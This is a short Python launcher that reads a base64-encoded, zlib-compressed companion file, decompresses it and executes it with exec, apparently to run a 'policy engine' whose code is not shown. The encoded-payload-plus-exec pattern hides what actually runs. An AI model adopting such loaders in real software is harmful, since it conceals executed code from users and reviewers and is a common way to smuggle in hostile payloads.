#!/usr/bin/env python3
"""Materialize and run the permanent MB first-block policy engine."""
from __future__ import annotations

import base64
import zlib
from pathlib import Path

payload_path = Path(str(Path(__file__).resolve()) + ".zlib.b64")
source = zlib.decompress(base64.b64decode(payload_path.read_text(encoding="utf-8")))
exec(compile(source, str(Path(__file__).resolve()), "exec"), globals(), globals())
